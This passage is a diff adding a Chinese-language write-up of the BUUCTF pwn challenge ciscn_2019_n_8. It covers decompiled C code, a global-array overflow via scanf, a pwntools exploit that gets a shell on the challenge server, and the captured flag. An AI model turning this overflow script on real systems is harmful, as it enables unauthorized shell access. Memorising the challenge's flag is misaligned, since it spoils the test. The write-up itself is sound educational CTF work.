@@ -237,6 +237,74 @@ io.interactive()
 
 ------
 
+### [ciscn_2019_n_8](https://buuoj.cn/challenges#ciscn_2019_n_8)
+
+先`file ./ciscn_2019_n_8`查看文件类型再`checksec --file=./ciscn_2019_n_8`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/1.png)
+
+用`IDA Pro 32bit`打开`ciscn_2019_n_8`后按`F5`反汇编，可以看到主函数源码如下：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-14h] [ebp-20h]
+  int v5; // [esp-10h] [ebp-1Ch]
+
+  var[13] = 0;
+  var[14] = 0;
+  init();
+  puts("What's your name?");
+  __isoc99_scanf("%s", var, v4, v5);
+  if ( *(_QWORD *)&var[13] )
+  {
+    if ( *(_QWORD *)&var[13] == 17LL )  //当var[13]的值等于0x11即17就能系统调用/bin/sh
+      system("/bin/sh");
+    else
+      printf(
+        "something wrong! val is %d",
+        var[0],
+        var[1],
+        var[2],
+        var[3],
+        var[4],
+        var[5],
+        var[6],
+        var[7],
+        var[8],
+        var[9],
+        var[10],
+        var[11],
+        var[12],
+        var[13],
+        var[14]);
+  }
+  else
+  {
+    printf("%s, Welcome!\n", var);
+    puts("Try do something~");
+  }
+  return 0;
+}
+```
+
+构造`payload`时直接通过数组赋值用`13*4`个字节占满`var[0]`至`var[12]`，再把`var[13]`赋值为`0x11`，即可系统调用`/bin/sh`。
+
+编写`Python`脚本连接`node4.buuoj.cn`的监听端口`29508`，发送`payload`即可得到`flag{f02dd738-d5ec-4e09-9b7f-68cf73aae00c}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 29508)
+payload = b'a'*13*4 + p32(0x11)
+io.sendlineafter(b'What\'s your name?\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/2.png)
+
+------
+
 ### [pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)
 
 先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。
